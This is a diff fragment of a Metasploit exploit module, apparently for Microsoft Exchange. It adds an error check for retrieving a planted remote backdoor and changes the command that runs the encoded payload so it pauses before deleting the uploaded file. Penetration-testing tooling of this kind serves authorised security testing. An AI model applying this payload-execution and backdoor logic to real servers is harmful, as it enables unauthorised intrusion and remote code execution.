@@ -360,6 +360,7 @@ class MetasploitModule < Msf::Exploit::Remote
       sleep 5
       i += 1
     end
+    fail_with(Failure::Unknown, 'Could\'t take the remote backdoor (see. ExchangePathBase option)') if received.code == 302
 
     [input_name, remote_file]
   end
@@ -505,7 +506,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
         print_warning('Dumping command output in response')
 
-        cmd = "#{payload.encoded} & del \"#{remote_file}\""
+        cmd = "#{payload.encoded} & timeout /t 5 & del \"#{remote_file}\""
         cmd = cmd.gsub('\\', '\\\\\\').gsub('&', '\u0026')
         cmd = cmd.gsub('"', '\\"')
         response = execute_command(cmd)
